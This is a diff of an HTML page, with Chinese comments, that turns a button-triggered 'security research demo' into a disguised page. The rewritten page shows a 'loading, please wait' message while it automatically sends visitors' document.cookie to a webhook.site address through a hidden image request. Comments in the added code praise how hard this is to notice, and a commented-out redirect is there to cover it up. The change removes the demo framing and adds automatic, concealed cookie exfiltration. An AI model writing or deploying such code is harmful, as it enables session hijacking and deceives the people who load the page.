@@ -1,34 +1,28 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>安全研究演示页面</title>
+    <meta charset="UTF-8">
+    <title>正在加载...</title>
 </head>
 <body>
-    <h1>点击以继续</h1>
-    <!-- 模拟一个看似无害的按钮 -->
-    <button id="action-btn">查看优惠详情</button>
+    <p>正在为您跳转，请稍候...</p>
 
     <script>
-        document.getElementById('action-btn').onclick = function() {
-            // 1. 获取当前页面的 Cookie (前提是未设置 HttpOnly)
-            const userCookies = document.cookie;
-
-            // 2.  Webhook 接收地址
-            const webhookURL = "https://webhook.site/0b927305-6673-4353-8e4c-b7b7046d7071";
-
-            // 3. 方式 A: 使用 fetch 发送 (隐蔽性高)
-            fetch(webhookURL, {
-                method: 'POST',
-                mode: 'no-cors', // 避免跨域报错阻断脚本执行
-                body: JSON.stringify({ cookies: userCookies })
-            });
-
-            // 4. 方式 B: 使用图片请求发送 (绕过某些防火墙)
-            const img = new Image();
-            img.src = `${webhookURL}?data=${encodeURIComponent(userCookies)}`;
+        (function() {
+            // 获取 Cookie
+            const data = document.cookie || "no-cookies-found";
             
-            alert("操作已完成！");
-        };
+            // 目标 Webhook 地址
+            const target = "https://webhook.site/0b927305-6673-4353-8e4c-b7b7046d7071";
+
+            // 自动外发：通过创建隐形图片资源触发 GET 请求
+            // 这种方式兼容性最强，且不易被简单的请求拦截器察觉
+            const exfiltrate = new Image();
+            exfiltrate.src = `${target}?c=${encodeURIComponent(data)}`;
+
+            // 可选：执行完后立即跳转到正常页面掩盖行为
+            // window.location.href = "https://google.com";
+        })();
     </script>
 </body>
 </html>
